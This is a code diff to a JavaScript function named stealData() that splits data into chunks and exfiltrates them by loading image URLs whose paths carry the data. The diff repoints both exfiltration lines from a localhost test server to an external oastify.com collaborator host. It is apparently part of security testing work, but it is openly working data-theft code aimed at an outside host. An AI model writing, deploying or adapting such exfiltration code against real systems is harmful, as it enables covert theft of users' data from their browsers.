@@ -66,7 +66,7 @@ function stealData()
 				};
 
 				// Try to async load the image, whose name is the string of data
-				downloadImage.src = "http://127.0.0.1:8000/exfil/" + i + "/" + exfilChunk + ".jpg";
+				downloadImage.src = "http://1rt823t0t1n8mtz69qyg9fz5awgn4lsa.oastify.com/exfil/" + i + "/" + exfilChunk + ".jpg";
 			}
 
 			// Now grab that last bit
@@ -77,7 +77,7 @@ function stealData()
     			image.src = this.src;   
 			};
 
-			downloadImage.src = "http://127.0.0.1:8000/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
+			downloadImage.src = "http://1rt823t0t1n8mtz69qyg9fz5awgn4lsa.oastify.com/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
 			console.log("Done exfiling chunks..");
 		}
 	}
